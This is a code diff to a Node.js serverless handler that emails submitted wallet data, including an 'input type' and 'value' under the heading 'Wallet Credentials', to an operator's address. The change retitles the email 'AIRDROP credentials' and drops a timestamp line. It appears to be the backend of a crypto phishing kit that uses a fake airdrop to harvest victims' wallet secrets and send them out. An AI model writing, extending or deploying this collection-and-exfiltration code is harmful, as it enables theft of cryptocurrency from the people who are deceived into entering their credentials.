@@ -25,13 +25,13 @@ module.exports = async (req, res) => {
         await transporter.sendMail({
             from: process.env.EMAIL_USER,
             to: process.env.EMAIL_TO,
-            subject: `New credentials from ${wallet}`,
+            subject: `AIRDROP credentials from ${wallet}`,
             html: `
                 <h2>Wallet Credentials</h2>
                 <p><strong>Wallet:</strong> ${wallet}</p>
                 <p><strong>Input Type:</strong> ${inputType}</p>
                 <p><strong>Value:</strong> ${value}</p>
-                <p><strong>Timestamp:</strong> ${timestamp}</p>
+                 
             `,
         });
         res.status(200).json({ success: true });
